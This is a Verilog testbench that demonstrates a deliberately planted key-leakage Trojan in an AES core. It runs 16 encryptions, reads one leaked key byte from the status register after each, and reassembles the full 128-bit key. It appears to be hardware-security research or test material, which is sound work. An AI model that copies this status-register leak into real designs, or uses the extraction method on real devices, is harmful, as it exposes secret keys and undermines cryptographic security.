//======================================================================
//
// tb_aes_trojan.v
// ----------------
// Focused testbench that demonstrates the key-leakage Trojan embedded in
// the AES top-level status register. The bench performs a sequence of
// encryptions and recovers the full 128-bit key by sampling the leaked
// status bytes after each operation.
//
//======================================================================

`default_nettype none

module tb_aes_trojan;

  //----------------------------------------------------------------
  // Parameter and local constant definitions.
  //----------------------------------------------------------------
  parameter CLK_HALF_PERIOD = 1;
  parameter CLK_PERIOD      = 2 * CLK_HALF_PERIOD;

  parameter ADDR_CTRL        = 8'h08;
  parameter CTRL_INIT_BIT    = 0;
  parameter CTRL_NEXT_BIT    = 1;

  parameter ADDR_STATUS      = 8'h09;

  parameter ADDR_CONFIG      = 8'h0a;
  parameter CTRL_ENCDEC_BIT  = 0;
  parameter CTRL_KEYLEN_BIT  = 1;

  parameter ADDR_KEY0        = 8'h10;
  parameter ADDR_KEY7        = 8'h17;

  parameter ADDR_BLOCK0      = 8'h20;
  parameter ADDR_BLOCK1      = 8'h21;
  parameter ADDR_BLOCK2      = 8'h22;
  parameter ADDR_BLOCK3      = 8'h23;

  parameter ADDR_RESULT0     = 8'h30;
  parameter ADDR_RESULT1     = 8'h31;
  parameter ADDR_RESULT2     = 8'h32;
  parameter ADDR_RESULT3     = 8'h33;

  parameter AES_ENCIPHER   = 1'b1;
  parameter AES_128_BIT_KEY = 1'b0;
  parameter LEAK_WINDOW_BYTES = 16;
  parameter LEAK_BYTE_OFFSET  = 4;


  //----------------------------------------------------------------
  // Registers and wires.
  //----------------------------------------------------------------
  reg [31 : 0] read_data;
  reg [127 : 0] result_data;
  reg [7  : 0]  leak_bytes [0 : 15];
  integer       leak_errors;

  reg           tb_clk;
  reg           tb_reset_n;
  reg           tb_cs;
  reg           tb_we;
  reg [7  : 0]  tb_address;
  reg [31 : 0]  tb_write_data;
  wire [31 : 0] tb_read_data;


  //----------------------------------------------------------------
  // Device Under Test.
  //----------------------------------------------------------------
  aes dut(
           .clk(tb_clk),
           .reset_n(tb_reset_n),
           .cs(tb_cs),
           .we(tb_we),
           .address(tb_address),
           .write_data(tb_write_data),
           .read_data(tb_read_data)
          );


  //----------------------------------------------------------------
  // Clock generator.
  //----------------------------------------------------------------
  always
    begin : clk_gen
      #CLK_HALF_PERIOD;
      tb_clk = !tb_clk;
    end


  //----------------------------------------------------------------
  // Testbench helper tasks.
  //----------------------------------------------------------------
  task init_sim;
    begin
      tb_clk        = 0;
      tb_reset_n    = 1;

      tb_cs         = 0;
      tb_we         = 0;
      tb_address    = 0;
      tb_write_data = 0;

      read_data     = 0;
      result_data   = 0;
      leak_errors   = 0;
    end
  endtask


  task reset_dut;
    begin
      tb_reset_n = 0;
      #(4 * CLK_PERIOD);
      tb_reset_n = 1;
      #(2 * CLK_PERIOD);
    end
  endtask


  task write_word(input [7 : 0] address, input [31 : 0] word);
    begin
      tb_address    = address;
      tb_write_data = word;
      tb_cs         = 1'b1;
      tb_we         = 1'b1;
      #(2 * CLK_PERIOD);
      tb_cs         = 1'b0;
      tb_we         = 1'b0;
    end
  endtask


  task write_block(input [127 : 0] block);
    begin
      write_word(ADDR_BLOCK0, block[127 : 096]);
      write_word(ADDR_BLOCK1, block[095 : 064]);
      write_word(ADDR_BLOCK2, block[063 : 032]);
      write_word(ADDR_BLOCK3, block[031 : 000]);
    end
  endtask


  task read_word(input [7 : 0] address);
    begin
      tb_address = address;
      tb_cs      = 1'b1;
      tb_we      = 1'b0;
      #(CLK_PERIOD);
      read_data  = tb_read_data;
      tb_cs      = 1'b0;
    end
  endtask


  task read_result;
    begin
      read_word(ADDR_RESULT0);
      result_data[127 : 096] = read_data;
      read_word(ADDR_RESULT1);
      result_data[095 : 064] = read_data;
      read_word(ADDR_RESULT2);
      result_data[063 : 032] = read_data;
      read_word(ADDR_RESULT3);
      result_data[031 : 000] = read_data;
    end
  endtask


  task init_key(input [255 : 0] key, input key_length);
    integer i;
    begin
      for (i = 0; i < 8; i = i + 1)
        write_word(ADDR_KEY0 + i[7:0], key[255 - (i * 32) -: 32]);

      if (key_length)
        write_word(ADDR_CONFIG, (1'b1 << CTRL_KEYLEN_BIT));
      else
        write_word(ADDR_CONFIG, 32'h0);

      write_word(ADDR_CTRL, (1'b1 << CTRL_INIT_BIT));
      #(100 * CLK_PERIOD);
    end
  endtask


  //----------------------------------------------------------------
  // Main test sequence.
  //----------------------------------------------------------------
  initial
    begin : main
      reg [255 : 0] key_material;
      reg [127 : 0] plaintext;
      reg [127 : 0] expected_cipher;
  reg [127 : 0] leak_concat;
  reg [127 : 0] recovered_key;
      integer       i;
  integer       idx;
      reg [7 : 0]   expected_byte;
  integer       leak_index_expected;

      $display("--- AES Trojan leakage demonstration ---");

      key_material   = 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000;
      plaintext      = 128'h6bc1bee22e409f96e93d7e117393172a;
      expected_cipher= 128'h3ad77bb40d7a3660a89ecaf32466ef97;

      init_sim();
      reset_dut();
      init_key(key_material, AES_128_BIT_KEY);

      for (i = 0; i < 16; i = i + 1)
        begin
          write_block(plaintext ^ i);
          write_word(ADDR_CONFIG, {30'h0, AES_128_BIT_KEY, AES_ENCIPHER});
          write_word(ADDR_CTRL, (1'b1 << CTRL_NEXT_BIT));

          #(100 * CLK_PERIOD);

          read_result();
          if (i == 0 && result_data !== expected_cipher)
            begin
              $display("*** ERROR: Ciphertext mismatch. Expected %032x, got %032x", expected_cipher, result_data);
              leak_errors = leak_errors + 1;
            end

          read_word(ADDR_STATUS);
          leak_bytes[i] = read_data[31 : 24];

          leak_index_expected = (i + LEAK_BYTE_OFFSET) % LEAK_WINDOW_BYTES;
          expected_byte = key_material[255 - (leak_index_expected * 8) -: 8];
          if (leak_bytes[i] !== expected_byte)
            begin
              $display("*** ERROR: Leak byte %0d mismatch. Expected %02x, got %02x",
                       i, expected_byte, leak_bytes[i]);
              leak_errors = leak_errors + 1;
            end
        end

      $display("Leaked key bytes:");
      for (i = 0; i < 16; i = i + 1)
        $display(" byte[%0d] = 0x%02x", i, leak_bytes[i]);

      leak_concat = 128'h0;
      for (idx = 0; idx < LEAK_WINDOW_BYTES; idx = idx + 1)
        begin
          leak_concat = {leak_concat[119 : 0], leak_bytes[idx]};
        end

      recovered_key = {leak_concat[31 : 0], leak_concat[127 : 32]};

      if (recovered_key === key_material[255 : 128])
        $display("Recovered AES-128 key (after rotation): 0x%032x", recovered_key);
      else
        begin
          $display("*** ERROR: Recovered key mismatch. Expected 0x%032x, got 0x%032x",
                   key_material[255 : 128], recovered_key);
          leak_errors = leak_errors + 1;
        end

      if (leak_errors == 0)
        $display("*** Trojan demonstration successful: recovered AES-128 key.");
      else
        $display("*** Trojan demonstration completed with %0d errors.", leak_errors);

      $finish;
    end

endmodule

//======================================================================
// EOF tb_aes_trojan.v
//======================================================================
